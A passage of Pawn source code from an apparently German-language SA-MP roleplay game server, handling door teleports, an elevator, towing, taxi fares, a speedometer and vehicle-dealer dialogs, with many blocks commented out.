	    	SetPlayerInterior(playerid,5);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,-2720.3408,-318.6624,7.8438))//triaden enter
	    {
	    	SetPlayerPos(playerid,2324.1921,-1148.9674,1050.7101);
	    	SetPlayerInterior(playerid,12);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2324.1921,-1148.9674,1050.7101))//triaden exit
	    {
	    	SetPlayerPos(playerid,-2720.3408,-318.6624,7.8438);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1172.5886,-1323.3914,15.4031))//Sanitäter Enter
	    {
	    	SetPlayerPos(playerid,1494.3601,1304.2662,1093.2891);
	    	SetPlayerInterior(playerid,3);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1494.3601,1304.2662,1093.2891))//Sanitäter Exit
	    {
	    	SetPlayerPos(playerid,1172.5886,-1323.3914,15.4031); // Pickup !
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
 //           }

//	    else if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
//	    {
		    if(IsPlayerInRangeOfPoint(playerid,3.0,2462.4351,80.6730,26.4564))
		    {
			    SetPlayerPos(playerid,-2636.5305,1403.4219,906.4609);
			    SetPlayerInterior(playerid,3);
			    SetPlayerVirtualWorld(playerid,3);
			}
  //          }
//	    else if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
//	    {
		    if(IsPlayerInRangeOfPoint(playerid,3.0,-2636.5305,1403.4219,906.4609))
		    {
			    SetPlayerPos(playerid,2462.4351,80.6730,26.4564);
			    SetPlayerInterior(playerid,0);
			    SetPlayerVirtualWorld(playerid,0);
			}
 //           }
*/

	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1480.9919,-1771.2096,18.7958))//Stadthalle /enter
	    {
	    	SetPlayerPos(playerid,389.9180,173.6584,1008.3828);
	    	SetPlayerInterior(playerid,3);
	    	SetPlayerFacingAngle(playerid,92.3491);
//	    	SendClientMessage(playerid,COLOR_GREEN,"Du hast die Stadthalle betreten");
		}
/*
	 	else if (IsPlayerInRangeOfPoint(playerid,4.0,329.0090,-1513.4635,36.0391))//SWAT /enter
		{
  			if(IsACop(playerid))
			{
			    SetPlayerPos(playerid,288.745971,169.350997,1007.171875);
			    SetPlayerInterior(playerid,3);
			    SetPlayerFacingAngle(playerid,2.5225);
//			    SendClientMessage(playerid,COLOR_GREEN, "Du hast das S.W.A.T Elite Troop Hauptquatier betreten");
			}
		}
		else if (IsPlayerInRangeOfPoint(playerid,4.0,288.745971,169.350997,1007.171875))//SWAT /exit
		{
  			if(IsACop(playerid))
			{
			    SetPlayerPos(playerid,329.0090,-1513.4635,36.0391);
			    SetPlayerInterior(playerid,0);
			    SetPlayerFacingAngle(playerid,1.8733);
//			    SendClientMessage(playerid,COLOR_GREEN, "Du hast das S.W.A.T Elite Troop Hauptquatier verlassen");
			}
		}
		else if (IsPlayerInRangeOfPoint(playerid,4.0,1164.4379,-1329.8876,31.4799))//Sani TP
		{
		    SetPlayerPos(playerid,1147.5365,-1342.6619,13.6357);
		    SetPlayerInterior(playerid,0);
		    SetPlayerFacingAngle(playerid,357.5767);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast die Stadthalle verlassen");
		}
		else if (IsPlayerInRangeOfPoint(playerid,4.0,1147.5365,-1342.6619,13.6357))//Sani TP
		{
		    SetPlayerPos(playerid,1164.4379,-1329.8876,31.4799);
		    SetPlayerInterior(playerid,0);
		    SetPlayerFacingAngle(playerid,357.5767);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast die Stadthalle verlassen");
		}
*/
		else if (IsPlayerInRangeOfPoint(playerid,4.0,389.9180,173.6584,1008.3828))//Stadthalle /exit
		{
		    SetPlayerPos(playerid,1480.9919,-1771.2096,18.7958);
		    SetPlayerInterior(playerid,0);
		    SetPlayerFacingAngle(playerid,357.5767);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast die Stadthalle verlassen");
		}
/*
		else if (IsPlayerInRangeOfPoint(playerid,3.0,1835.9020,-1682.5295,13.3704))
		{
		    SetPlayerPos(playerid,493.390991,-22.722799,1000.679687);
		    SetPlayerInterior(playerid, 17);
//		    SendClientMessage(playerid,COLOR_RED, "Du hast Alahmbra betreten");
		}
		else if (IsPlayerInRangeOfPoint(playerid,3.0,493.390991,-22.722799,1000.679687))
		{
		    SetPlayerPos(playerid,1835.9020,-1682.5295,13.3704);
		    SetPlayerInterior(playerid, 0);
//		    SendClientMessage(playerid,COLOR_RED, "Du hast Alahmbra verlassen");
		}
*/
/*
		else if(IsPlayerInRangeOfPoint(playerid,4.0,811.4277,-1616.1138,13.5469))//BSSENTER
		{
			SetPlayerPos(playerid,457.304748,-88.428497,999.554687);
			SetPlayerInterior(playerid, 4);
//			SendClientMessage(playerid,COLOR_GREEN,"Du hast den Burger Shot South betreten!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,457.304748,-88.428497,999.554687))//BSSEXIT
		{
		    SetPlayerPos(playerid,811.4277,-1616.1138,13.5469);
		    SetPlayerInterior(playerid, 0);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast den Burger Shot South verlassen!");
		}
*/
/*
		else if(IsPlayerInRangeOfPoint(playerid,4.0,238.6158,139.8980,1003.0234))//S.W.A.T Exit
		{
		    SetPlayerPos(playerid,2336.9761,2458.5974,14.9688);
		    SetPlayerInterior(playerid, 0);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast das LSPD Betreten!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2336.9761,2458.5974,14.9688))//S.W.A.T Enter
		{
		    SetPlayerPos(playerid,238.6158,139.8980,1003.0234);
		    SetPlayerInterior(playerid, 3);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast das LSPD Betreten!");
		}
*/

/*

		else if(IsPlayerInRangeOfPoint(playerid,4.0,231.2622,182.2081,1003.0313))//S.W.A.T Exit Garage
		{
		    SetPlayerPos(playerid,-12.9655,-2519.8782,36.8200);
		    SetPlayerInterior(playerid, 0);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast das LSPD Betreten!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-12.9655,-2519.8782,36.8200))//S.W.A.T Enter Garage
		{
		    SetPlayerPos(playerid,231.2622,182.2081,1003.0313);
		    SetPlayerInterior(playerid, 3);
//		    SendClientMessage(playerid,COLOR_GREEN, "Du hast das LSPD Betreten!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2548.8479,-1295.0243,1060.9844))///wexit
		{
		    SetPlayerPos(playerid,-516.1633,-506.0980,25.5234);
		    SetPlayerInterior(playerid, 0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-516.1633,-506.0980,25.5234))///wenter
		{
		    SetPlayerPos(playerid,2548.8479,-1295.0243,1060.9844);
		    SetPlayerInterior(playerid, 2);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,1014.4359,-15.6008,-2.0652))//Alca Exit
		{
		    SetPlayerPos(playerid,-341.8454,4054.2869,30.8625);
		    SetPlayerInterior(playerid, 0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-341.8454,4054.2869,30.8625))//Alca Exit
		{
		    SetPlayerPos(playerid,1014.4359,-15.6008,-2.0652);
		    SetPlayerInterior(playerid, 0);
		}
*/
		else if(IsPlayerInRangeOfPoint(playerid,4.0,1554.7158,-1675.5486,16.1953))//LSPD Enter
		{
		    SetPlayerPos(playerid,246.7333,63.1185,1003.6406);
		    SetPlayerInterior(playerid, 6);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,246.7333,63.1185,1003.6406))//LSPD exit
		{
		    SetPlayerPos(playerid,1554.7158,-1675.5486,16.1953);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if (AtATM(playerid))//atm mit enter drücken
		{
            OnPlayerCommandText(playerid,"/atm");
		}
/*
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2495.3865,-1690.6353,14.7656))//GS Enter
		{
		    SetPlayerPos(playerid,2807.5378,-1173.8975,1025.5703);
		    SetPlayerInterior(playerid, 8);
            SetPlayerVirtualWorld(playerid,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2807.5378,-1173.8975,1025.5703))//GS Exit
		{
		    SetPlayerPos(playerid,2495.3865,-1690.6353,14.7656);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,248.3470,1783.5630,701.0859))//San news exit
		{
		    SetPlayerPos(playerid,314.0237,-1516.1582,24.9219);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,314.0237,-1516.1582,24.9219))//San news enter
		{
		    SetPlayerPos(playerid,248.3470,1783.5630,701.0859);
		    SetPlayerInterior(playerid, 5);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,246.3699,108.5952,1003.2188))//FBI Exit
		{
		    SetPlayerPos(playerid,-1605.3094,711.6002,13.8672);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-1605.3094,711.6002,13.8672))//FBI Enter
		{
		    SetPlayerPos(playerid,246.3699,108.5952,1003.2188);
		    SetPlayerInterior(playerid, 10);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,214.8359,121.1326,999.0156))//FBI exit Garage
		{
		    SetPlayerPos(playerid,-1606.3243,673.1292,-5.2422);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-1606.3243,673.1292,-5.2422))//FBI enter Garage
		{
		    SetPlayerPos(playerid,214.8359,121.1326,999.0156);
		    SetPlayerInterior(playerid, 10);
            SetPlayerVirtualWorld(playerid,0);
		}







		else if(IsPlayerInRangeOfPoint(playerid,4.0,-2648.96, 492.62, 1227.32))//SF BIKLER
		{
		    SetPlayerPos(playerid,-2624.46, 1411.65, 6.09);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-2624.46, 1411.65, 6.09))//SF BIKLER
		{
		    SetPlayerPos(playerid,-2648.96, 492.62, 1227.32);
            SetPlayerVirtualWorld(playerid,0);
		}





		else if(IsPlayerInRangeOfPoint(playerid,4.0,1554.7158,-1675.5486,16.1953))//LSPD Enter
		{
		    SetPlayerPos(playerid,246.7333,63.1185,1003.6406);
		    SetPlayerInterior(playerid, 6);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,246.7333,63.1185,1003.6406))//LSPD exit
		{
		    SetPlayerPos(playerid,1554.7158,-1675.5486,16.1953);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,246.3375,87.0330,1003.6406))//LSPD exit garage
		{
		    SetPlayerPos(playerid,1525.6204,-1677.7919,5.8906);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,1525.6204,-1677.7919,5.8906))//LSPD enter garage
		{
		    SetPlayerPos(playerid,246.3375,87.0330,1003.6406);
		    SetPlayerInterior(playerid, 6);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,318.5725,1114.9063,1083.8828))//BALLS EXIT
		{
		    SetPlayerPos(playerid,2000.0635,-1114.6185,27.1250);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2000.0635,-1114.6185,27.1250))//BALLS Enter
		{
		    SetPlayerPos(playerid,318.5725,1114.9063,1083.8828);
		    SetPlayerInterior(playerid, 5);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2496.0439,-1692.5247,1014))//SF Rifa Exit
		{
		    SetPlayerPos(playerid,-2529.0854,-19.1742,16.4219);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-2529.0854,-19.1742,16.4219))//SF Rifa Enter
		{
		    SetPlayerPos(playerid,2496.0439,-1692.5247,1014);
		    SetPlayerInterior(playerid, 3);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,2570.0496,2288.8811,11.0700))//russen enter
		{
			    SetPlayerPos(playerid,1703.4513,-1668.1116,20.2188);
			    SetPlayerFacingAngle(playerid,276.7126);
				SetPlayerInterior(playerid,18);
			    SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,1701.3274,-1667.7771,20.2188))//russen exit
		{
			    SetPlayerPos(playerid,2570.0496,2288.8811,11.0700);
			    SetPlayerFacingAngle(playerid,309.5732);
				SetPlayerInterior(playerid,0);
   			    SetPlayerVirtualWorld(playerid,0);
		}
*/
		else if(IsPlayerInRangeOfPoint(playerid,4.0,246.3699,108.5952,1003.2188))//FBI Exit
		{
		    SetPlayerPos(playerid,-1605.3094,711.6002,13.8672);
		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,-1605.3094,711.6002,13.8672))//FBI Enter
		{
		    SetPlayerPos(playerid,246.3699,108.5952,1003.2188);
		    SetPlayerInterior(playerid, 10);
            SetPlayerVirtualWorld(playerid,0);
		}
	}

	if(!IsPlayerInAnyVehicle(playerid) && newkeys & KEY_SECONDARY_ATTACK)
	{
	    new Float:pos[3];
	    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
	    if(pos[1] < -1301.4 && pos[1] > -1303.2417 && pos[0] < 1786.2131 && pos[0] > 1784.1555)    // He is using the elevator button
	        ShowElevatorDialog(playerid);
		else    // Is he in a floor button?
		{
		    if(pos[1] > -1301.4 && pos[1] < -1299.1447 && pos[0] < 1785.6147 && pos[0] > 1781.9902)
		    {
		        // He is most likely using it, check floor:
				new i=20;
				while(pos[2] < GetDoorsZCoordForFloor(i) + 3.5 && i > 0)
				    i --;

				if(i == 0 && pos[2] < GetDoorsZCoordForFloor(0) + 2.0)
				    i = -1;

				if(i <= 19)
				{
					CallElevator(playerid, i + 1);
					GameTextForPlayer(playerid, "~r~Aufzug gerufen", 3500, 4);
				}
		    }
		}
	}
    //=========
    if((newkeys == KEY_ACTION) && (IsPlayerInAnyVehicle(playerid)) && (GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
    {
        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525)
    	{
            SendClientMessage(playerid, COLOR_GRAD1, "Versuche das Auto abzuschleppen...");
            //new Float:pX, Float:pY, Float:pZ;
            GetPlayerPos(playerid, pX, pY, pZ);
            new Float:vX, Float:vY, Float:vZ;
            new Found = 0;
            new kvid = 0;
            while((kvid < MAX_VEHICLES) && (!Found))
            {
   				kvid++;
   				GetVehiclePos(kvid,vX,vY,vZ);
                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
                {
                    Found = 1;
                    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
                    {
                        DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
					}
					AttachTrailerToVehicle(kvid, GetPlayerVehicleID(playerid));
					GameTextForPlayer(playerid, "Fahrzeug am Haken", 5000, 1);
				}
			}
			if(!Found)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
			}
		}
	}
 //=========

	if(newkeys == 16 && InCargo[playerid])
	{
		new Float:X, Float:Y, Float:Z;
		GetVehiclePos(InCargo[playerid], X, Y, Z);
		SetPlayerPos(playerid, X+4, Y, Z);
		SetPlayerInterior(playerid, 0);
		InCargo[playerid] = 0;
	}
	if(newkeys == 16 && InLevi[playerid])
	{
		new Float:X, Float:Y, Float:Z;
		GetVehiclePos(InLevi[playerid], X, Y, Z);
		SetPlayerPos(playerid, X+4, Y, Z);
		SetPlayerInterior(playerid, 0);
		InLevi[playerid] = 0;
	}
	if(newkeys == 16 && InEnfo[playerid])
	{
	    new Float:X, Float:Y, Float:Z;
	    GetVehiclePos(InEnfo[playerid], X, Y, Z);
	    SetPlayerPos(playerid, X+4, Y, Z);
	    SetPlayerInterior(playerid, 0);
		InEnfo[playerid] = 0;
	}
	if(newkeys && KEY_FIRE)
	{
        new fid = PlayerInfo[playerid][sMember];
		if(FrakInfo[fid][BombeAktiv] == 1)
		{
		    new vid = FrakInfo[fid][BombeAutoID];
		    if(vid != INVALID_VEHICLE_ID)
		    {
		        new terrorist = FrakInfo[fid][BombeVon];
                if(terrorist != INVALID_PLAYER_ID)
                {
                    SCM(playerid,-1,"In 10 Sekunden geht die Bombe hoch! Bring dich in Sicherheit!");
                    FrakInfo[fid][BombeAktiv]= 0;
                    SetTimerEx("BombeBOOM", 10000, 0,"ii",playerid,vid);
				}

			}
		}
	}
	return 1;
}
Function OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(newstate == PLAYER_STATE_ONFOOT)
	{

	 StopAudioStreamForPlayer(playerid);
							musikan[playerid] = 0;

	TextDrawHideForPlayer(playerid, Textdrawaisahuso[playerid]);

		RemovePlayerAttachedObject(playerid, SLOT);
		if(TransportDuty[playerid] > 0)
		{
			if(TransportDuty[playerid] == 1)
			{
				 TaxiDrivers -= 1;
			}
			new string[128];
			TransportDuty[playerid] = 0;
			format(string, sizeof(string), "* Du bist nun außer Dienst und hast $%d verdient.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerMoneySave(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
			SetPlayerToTeamColor(playerid);
		}
	}
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
/*
		switch (oldstate)
		{
		    case PLAYER_STATE_PASSENGER:
		        SetSyncTime (playerid, SYNC_TYPE_POS);
		}
*/

		new vehicleid = GetPlayerVehicleID(playerid);
		if(IsADtCar(vehicleid))// Privatfahrzeug
		{

			new carowner = GetDtCarOwner(vehicleid);
			new slot = GetDtCarOwnerSlot(carowner,vehicleid);

			PlayMusic(playerid,PlayerCar[carowner][slot][SoundSystemData]);
	    	TextDrawShowForPlayer(playerid, Textdrawaisahuso[playerid]);

		}


		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 438)
		{
			ShowPlayerDialog(playerid,DIALOG_TAXIFAHRER, DIALOG_STYLE_INPUT, "Taxifahrer", "Bitte gebe nun den Fahrpreis an der Preis muss zwischen 1 und 500 Doller liegen:", "Ok", "Abbrechen");
		}
	}

//----------------------------------------------
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		TextDrawSetString(Speedo[playerid],"~B~Fahrzeug: ~W~-~n~~B~Km/h: ~W~- km/h~n~~B~Zustand: ~W~-~n~~B~Benzin: ~W~-l/-l~n~~B~GPS: ~W~-");
		TextDrawSetString(tacho[playerid],"~B~KM-Stand:~W~ -");
		TextDrawHideForPlayer(playerid, tacho[playerid]);
		TextDrawHideForPlayer(playerid, Textdraw10[playerid]);

		TextDrawHideForPlayer(playerid, Speedo[playerid]);
		KillTimer(tachotimer[playerid]);
//		TextDrawShowForPlayer(playerid,ServerN);
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{

		TextDrawShowForPlayer(playerid,Textdraw10[playerid]);

		TextDrawShowForPlayer(playerid,Speedo[playerid]);
		TextDrawShowForPlayer(playerid,tacho[playerid]);
		if(!IsANoTachoVehicle(GetPlayerVehicleID(playerid)))
		{
			tachotimer[playerid] = SetTimerEx("Speedometer", 100, 1, "d", playerid);
		}
	}
//----------------------------------------------

    if(newstate == PLAYER_STATE_DRIVER||newstate == PLAYER_STATE_PASSENGER && oldstate == PLAYER_STATE_ONFOOT)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerConnected(i))
		    {
				if (PlayerInfo[i][pAdmin] > 2)
				{
					if (WatchingTV[i] == 1)
					{
						if (playerid == Spectate[i])
						{
					 	    new carid = GetPlayerVehicleID(playerid);
					  	    PlayerSpectateVehicle(i, carid);
						}
					}
				}
			}
		}
	}
    if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER|| oldstate == PLAYER_STATE_PASSENGER)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerConnected(i))
		    {
				if (PlayerInfo[i][pAdmin] > 2)
				{
					if (WatchingTV[i] == 1)
					{
						if (playerid == Spectate[i])
						{
					 	   PlayerSpectatePlayer(i, playerid);
						}
					}
				}
			}
		}
	}
    if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(PlayerInfo[playerid][pJob] == 10)
	    {
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 511)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /flug um die Runde zu starten!.");
			}
		}
	}
    if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(PlayerInfo[playerid][pJob] == 3)
	    {
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 538)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /start um die Runde zu starten!.");
			}
		}
	}
    if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(PlayerInfo[playerid][pJob] == 14)
	    {
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 431)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /linie um eine Linie zu starten!.");
			}
		}
	}
    if(newstate == PLAYER_STATE_DRIVER)
	{
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "{FFEE00}Du kannst das Fahrzeug mit {FF4000}/motor {FFEE00}starten. Die Scheinwerfer können mit {FF4000}/licht {FFEE00}angeschaltet werden.");
	}
	// Wenn nur einzelne Parameter geändert werden, sollten die anderen abgefragt werden, damit sich nicht alles ändert
    if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER)
	{
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(gLastCar[playerid], engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(gLastCar[playerid], engine, lights, alarm, 0, bonnet, boot, objective);
	}
    if(newstate == PLAYER_STATE_DRIVER)
	{
		if(IsAHandelCar(GetPlayerVehicleID(playerid)) || IsAShowCarEdel(GetPlayerVehicleID(playerid)))
		{
		    new vid = GetPlayerVehicleID(playerid);
		    GetCarAutohaus(playerid, vid);
			dtc_AutohausCar[playerid] = GetVehicleModel(vid);
			new car, preis;
			for(new ah = 0; ah < sizeof(dtcKaufliste);ah++)
	    	{
	    		if(car == 0 && dtcKaufliste[ah][dtc_Autohaus] == dtc_AutohausCat[playerid] && dtcKaufliste[ah][dtc_CarModel] == GetVehicleModel(vid))
	    		{
	    		    car = dtcKaufliste[ah][dtc_CarModel];
	    			preis = dtcKaufliste[ah][dtc_CarPreis];
	    		}
	    	}
	    	dtc_AutohausSCar[playerid] = GetPlayerVehicleID(playerid);
            new gesamtstring[128];
            format(gesamtstring,sizeof(gesamtstring),"Fahrzeug: %s\nPreis: %d\n\n Möchtest du dieses Fahrzeug kaufen ?",CarName[car-400], preis);
            ShowPlayerDialog(playerid, 1338, DIALOG_STYLE_MSGBOX, CarName[car-400], gesamtstring, "Kaufen", "Verlassen");
		}
	}
	new string[256];
    if(newstate == PLAYER_STATE_DRIVER)
	{
	new vehicleid = GetPlayerVehicleID(playerid);
	if(vehicleid)VehicleDriverPlayerid[vehicleid - 1] = playerid;
    }

 	if((newstate == PLAYER_STATE_DRIVER))
  	{
   		for(new j=0; j<11; j++) GetPlayerWeaponData(playerid, j, Weapons[playerid][j], Ammo[playerid][j]);
     	ResetPlayerWeapons(playerid);
   	}
    if((newstate == PLAYER_STATE_ONFOOT) && ((oldstate == PLAYER_STATE_DRIVER)))
    {
    	for(new j=0; j<11; j++) ServerWeapon(playerid, Weapons[playerid][j], Ammo[playerid][j]);
   		return 1;
    }
    if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
    {
        new Weap[2];
        GetPlayerWeaponData(playerid, 4, Weap[0], Weap[1]);
        SetPlayerArmedWeapon(playerid, Weap[0]);
	}
 	if(newstate==PLAYER_STATE_DRIVER)
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525)
		{
			if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)
			{
	        	IsTowTrucker[playerid]=1;
	        	TowTruckers++;
   				SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Nutze die Strg Taste, um ein Auto abzuschleppen.");
			}
		}
	}
	else if(TowTruckers > 0 && newstate == PLAYER_STATE_DRIVER)
	{
 		SendClientMessage(playerid, COLOR_YELLOW, "Wenn Probleme auftreten ruf den Ordnungstienst mit /noamt.");
	}
	else if(newstate == PLAYER_STATE_ONFOOT &&(IsTowTrucker[playerid] == 1))
	{
 		IsTowTrucker[playerid] = 0;
   		TowTruckers--;
	}
	else if(newstate == PLAYER_STATE_PASSENGER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 417)
	{
     	SetPlayerPos(playerid, 1261.269,-803.480,1185.830);
     	SetPlayerFacingAngle(playerid, 0);
        SetCameraBehindPlayer(playerid);
        SetPlayerInterior(playerid, 1);
		InLevi[playerid] = GetPlayerVehicleID(playerid);
	}
	else if(newstate == PLAYER_STATE_PASSENGER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 548)
	{
     	SetPlayerPos(playerid, 89.773613, 2027.749756, 2865.647705);
     	SetPlayerFacingAngle(playerid, 0);
        SetCameraBehindPlayer(playerid);
        SetPlayerInterior(playerid, 0);
		InCargo[playerid] = GetPlayerVehicleID(playerid);
	}
	else if(newstate == PLAYER_STATE_PASSENGER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 427 && IsACop(playerid))
	{
	    SetPlayerPos(playerid, 260.4671,118.6456,1029.7023);
	    SetPlayerFacingAngle(playerid, 178.6620);
	    SetCameraBehindPlayer(playerid);
	    SetPlayerInterior(playerid, 3);
	    InEnfo[playerid] = GetPlayerVehicleID(playerid);
	}
	else if(newstate == PLAYER_STATE_PASSENGER && PlayerInfo[playerid][pJailed] > 0 && !IsAPlane(GetPlayerVehicleID(playerid)))
	{
		TogglePlayerControllable(playerid,false);
		TogglePlayerControllable(playerid,true);
	}
	if(newstate == PLAYER_STATE_ONFOOT)
	{
	    if(PlayerKarting[playerid] > 0 && PlayerInKart[playerid] > 0)
		{
		    PlayerInKart[playerid] = 0;
		    KartingPlayers --;
		}
/*
	    if(TransportDuty[playerid] > 0)
		{
		    if(TransportDuty[playerid] == 1)
			{
		        TaxiDrivers -= 1;
			}
			else if(TransportDuty[playerid] == 2)
			{
			    BusDrivers -= 1;
			}
			TransportDuty[playerid] = 0;
			format(string, sizeof(string), "* Nun bist du nicht mehr im Dienst, du hast $%d verdient.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerMoneySave(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
		}
*/
		if(TransportCost[playerid] > 0 && TransportDriver[playerid] < 999)
		{
		    if(IsPlayerConnected(TransportDriver[playerid]))
			{
			    TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
			    TransportTime[TransportDriver[playerid]] = 0;
			    TransportCost[TransportDriver[playerid]] = 0;
			    format(string, sizeof(string), "~w~Der Transport kostet~n~~r~$%d",TransportCost[playerid]);
			    GameTextForPlayer(playerid, string, 5000, 1);
			    format(string, sizeof(string), "~w~Der Kunde verlässt das Fahrzeug~n~~g~Du bekommst $%d",TransportCost[playerid]);
			    GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
				GivePlayerMoneySave(playerid, -TransportCost[playerid]);
				TransportCost[playerid] = 0;
				TransportTime[playerid] = 0;
				TransportDriver[playerid] = 999;
			}
		}
		TelePos[playerid][0] = 0.0;
